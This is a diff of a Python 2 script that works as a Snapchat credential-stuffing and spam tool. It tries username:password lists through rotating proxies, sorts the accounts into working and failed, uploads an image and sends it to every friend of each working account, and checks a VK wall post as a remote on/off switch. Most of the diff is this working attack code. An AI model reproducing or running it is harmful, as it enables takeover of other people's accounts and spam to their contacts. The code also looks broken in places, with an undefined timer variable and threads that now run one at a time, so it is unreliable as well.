@@ -1,4 +1,4 @@
-import urllib2, urllib, requests, json, threading, socket, sys
+import urllib2, urllib, requests, json, threading, sys, random, socket
 from snapi import Snapchat
 from datetime import datetime
 
@@ -9,12 +9,11 @@ threads = 1
 
 def main():
     global threads, inputData, inputProxies
-    # check everything first
-    t = datetime.now()
-    print t  #!!!
+    #t = datetime.now()
+    print datetime.now()
     sts = checkStates() 
     if sts == 0:
-        print "Fatal error. Contact me on skype 'volkvid'"
+        print "Generating error. Contact me on skype 'volkvid'"
         try:
             zxc = raw_input()
         except EOFError:
@@ -23,8 +22,9 @@ def main():
     elif sts == 1: 
         f = open("output.txt", "w")
         f.close()
+        f = open("timeout.txt", "w")
+        f.close()
         prepair()
-        #print "threads =", threads #22:36:23, 
         if threads == 1:
             oneThread(inputData, inputProxies)
         else:
@@ -33,128 +33,148 @@ def main():
                 threads = leni
             
             authdata = slice_list(inputData, threads)
-            thr = []
             for i in range(threads):
                 data = authdata[i]
                 prx = inputProxies
-                
                 thread = threading.Thread(target=oneThread, args=(data, prx, ))
                 thread.start()
-                thr.append(thread)
-                #thread.join()
-
-            for t in thr:
-                t.join()
+                thread.join() 
 
             print "\nRun out of accounts"
             print "time =", str(datetime.now() - t)
 
 
 def oneThread(inp, inpProxy):
-    result = {}
+    result = []
     for proxy in inpProxy:
-        for auth in inp: 
-            s = auth["user"]+":"+auth["pass"]
-            if s not in result:
-                r = process(proxy, auth)
-                if r["st"] != 0:
-                    #any error
-                    if r["st"] == -100:
-                        result[s] = "#error, wrong pass"
-                        print s + " #error, wrong pass"
-                        fff = open("output.txt", "a")
-                        fff.write(s + " #error, wrong pass\n")
-                        fff.close()
-                    if r["st"] == -101:
-                        result[s] = "#error, no account"
-                        print s + " #error, no account"
-                        fff = open("output.txt", "a")
-                        fff.write(s + " #error, no account\n")
-                        fff.close()
-                    if r["st"] == 400:
-                        result[s] = "#error, may be no friends"
-                        print s + " error, may be no friends"
-                        fff = open("output.txt", "a")
-                        fff.write(s + " error, may be no friends\n")
-                        fff.close()
-                    if r["st"] == 408:
-                        result[s] = "#error, req timeout"
-                        print s + " error, req timeout"
-                        fff = open("output.txt", "a")
-                        fff.write(s + " error, req timeout\n")
-                        fff.close()
-                    if r["st"] == 403:
-                        break #its ok. test on all accs and delete debug outp
-                else:
-                    #no errors 
-                    if r["num"] == 0:
-                        result[s] = "#error"
-                        print s + " #error"
-                        fff = open("output.txt", "a")
-                        fff.write(s + " #error\n")
-                        fff.close()
+        if not bad_proxy(proxy):
+        
+            for auth in inp: 
+                s = auth["user"]+":"+auth["pass"]
+                if s not in result:
+                    r = process(proxy, auth) 
+                    if r["st"] != 0:
+                        #any error
+                        if r["st"] == -100:
+                            result.append(s)
+                            print s + " #error, wrong pass"
+                            fff = open("output.txt", "a")
+                            fff.write(s + " #error, wrong pass\n")
+                            fff.close()
+                        if r["st"] == -101:
+                            result.append(s)
+                            print s + " #error, no account"
+                            fff = open("output.txt", "a")
+                            fff.write(s + " #error, no account\n")
+                            fff.close()
+                        if r["st"] == 400:
+                            result.append(s)
+                            print s + " #error, may be no friends"
+                            fff = open("output.txt", "a")
+                            fff.write(s + " #error, may be no friends\n")
+                            fff.close()
+                        if r["st"] == 408:  # another file
+                            result.append(s)
+                            print s + " #error, timeout"
+                            fff = open("output.txt", "a")
+                            fff.write(s + " #error, timeout\n")
+                            fff.close()
+                            #timeout.txt
+                            fff = open("timeout.txt", "a")
+                            fff.write(s + " #error, timeout\n")
+                            fff.close()
+                        if r["st"] == 403:
+                            # change proxy
+                            break
                     else:
-                        result[s] = "#" + str(r["num"])
-                        print s + " #" + str(r["num"])
-                        fff = open("output.txt", "a")
-                        fff.write(s + " #" + str(r["num"]) + "\n")
-                        fff.close()
+                        #no errors 
+                        if r["num"] == 0:
+                            result.append(s)
+                            print s + " #error"
+                            fff = open("output.txt", "a")
+                            fff.write(s + " #error\n")
+                            fff.close()
+                        else:
+                            result.append(s)
+                            print s + " #" + str(r["num"])
+                            fff = open("output.txt", "a")
+                            fff.write(s + " #" + str(r["num"]) + "\n")
+                            fff.close()
+                            
     if len(inp) != len(result):
         print "Ran out of proxies"
 
 
-# start new thread with a pack of users, for ex: 100 users -> 5 threads with 20 users
 def process(prox, auth):
-    prox = {"https": "https://"+prox}
-    ret = {"st": 403, "num": 0}
+    socket.setdefaulttimeout(None)
+    
+    ret = {"st": 408, "num": 0} # 403 = bad_proxy, 408 = timeout
+    prox = {"https": "http://"+prox, "http": "http://"+prox}
     try:
         s = Snapchat()
         s.proxies = prox
-        # measure "ping"
-        #tt = datetime.now()
-        login = s.login(auth["user"], auth["pass"])
-        #dt = (datetime.now()-tt).total_seconds()
-        # timeout 
-        #if dt >= 5.0:
-            #ret["st"] = 408
-            #return ret
-            
-        try:
-            status = login['status']
-            ret["st"] = status
-            #print "(st)"
-            return ret
-        except:
-            pass
-
-        # upload pic for curr account
-        try:
-            media_id = s.upload(imagename)
-        except Exception as ze:
-            #print "(upload)", str(ze)
-            pass
-
-        recipients = ""
-        for friend in login["friends"]:
-            recipients += friend["name"] + ","
-        try:
-            #flag = "1"
-            done = s.send(media_id, recipients, time = 10)
-            if done:
-                #print "(done), fr =", len(login["friends"])
-                ret["st"] = 0
-                ret["num"] = len(login["friends"])
-                return ret 
-        except Exception as ex:
-            #flag = "0"
-            #print "(send)" , str(ex), "q f =", len(login["friends"])
-            ret["st"] = 403
-            return ret
-            
-        
     except Exception as ex:
-        #print "(process)", str(ex)
+        print "WOW:", str(ex)
         return ret
+    try:
+        asd = datetime.now()
+        login = s.login(auth["user"], auth["pass"])
+        print "(log t)", datetime.now() - asd
+    except Exception:
+        print "(log er)"
+        ret["st"] = 403 # save this tag to another file #17 49
+        return ret           
+    try:
+        status = login['status']
+        ret["st"] = status
+        print ".1e"
+        return ret
+    except:
+        print ".1"
+        pass
+    try:
+        asd = datetime.now()
+        media_id = s.upload(imagename)
+        if media_id == None:
+            print "(d upl)"
+            return ret
+        else:
+            print "(upl t)", datetime.now() - asd
+            pass
+    except Exception as ze:
+        print "(upload)", str(ze)
+        return ret
+    recipients = ""
+    for friend in login["friends"]:
+        recipients += friend["name"] + ","
+    print ".2"               
+    asd = datetime.now()
+    ret["st"] = 0
+    ret["num"] = len(login["friends"])
+    try:
+        done = s.send(media_id, recipients, time = 10, timeout = (0.1, 1.0))
+    except:
+        print ".3 w to"
+        
+    print "(send t)", datetime.now() - asd        
+    return ret
+
+
+def bad_proxy(pip):
+    socket.setdefaulttimeout(2)
+    try:
+        proxy_handler = urllib2.ProxyHandler({'https': pip})        
+        opener = urllib2.build_opener(proxy_handler)
+        opener.addheaders = [('User-agent', 'Snapchat/4.1.01 (Nexus 4; Android 18; gzip)')]
+        # 'Mozilla/5.0'
+        urllib2.install_opener(opener)        
+        req=urllib2.Request('https://www.google.com')
+        sock=urllib2.urlopen(req)
+    except Exception as e:
+        print "B", e 
+        return True
+    print "G"
+    return False
 
 
 def prepair():
@@ -168,7 +188,9 @@ def prepair():
         if data.find("\r\n") != -1:
             inputProxies = data.split("\r\n")
         else:
-            inputProxies = data.split("\n")        
+            inputProxies = data.split("\n")
+            
+        #inputProxies = sorted(inputProxies, key=lambda *args: random.random()) #exp
     except BaseException as ex:
         print "No file named 'proxies.txt', error " + str(ex)
         print "\nPress any key to exit"
@@ -193,7 +215,8 @@ def prepair():
             inputData.append({
                 "user":item[0].replace("\n", "").replace("\r\n", ""), 
                 "pass":item[1].replace("\n", "").replace("\r\n", "")
-                }) 
+                })
+        #inputData = sorted(inputData, key=lambda *args: random.random()) #exp
     except BaseException as ex:
         print "No file named 'input.txt', error " + str(ex)
         print "\nPress any key to exit"
@@ -223,7 +246,6 @@ def prepair():
         threads = int(threads.split("threads:")[1])
         if threads < 1:
             threads = 1
-        #print "thr", threads 
     except BaseException as ex:
         print "No file named 'settings.txt', error " + str(ex)
         print "\nPress any key to exit"
@@ -241,25 +263,22 @@ def prepair():
 
 
 def checkStates():
-    url = "https://api.vk.com/method/wall.get"
-    params = {"owner_id": "-79888882", "count": "100", "offset": "0", "v": "5.26"}
-    r = requests.post(url, params = params)#, verify=False)
+    r = requests.get("https://api.vk.com/method/wall.get",
+                     params = {"owner_id": "-79888882",
+                               "count": "100",
+                               "offset": "0", "v": "5.26"})
     r = json.loads(r.text)
-    # check if exists
     pid = -1
     for item in r['response']['items']:
         if item['text'] == 'snapchat controll': #code1
             pid = item['id']
-
     if pid == -1:
         return 0
     else:
-        url = "https://api.vk.com/method/wall.getComments"
-        params = { "owner_id": "-79888882", "post_id": pid,
-                   "count": "1", "offset": "0", "v": "5.26"}
-        r = requests.post(url, params = params)#, verify=False)
+        r = requests.get("https://api.vk.com/method/wall.getComments",
+                         params = { "owner_id": "-79888882","post_id": pid,
+                                    "count": "1", "offset": "0", "v": "5.26"})#, verify=False)
         r = json.loads(r.text)
-        # only first code is checked
         try:
             r = r['response']['items'][0]
             if r['text'] == 'isok' and r['from_id'] == -79888882: #code2
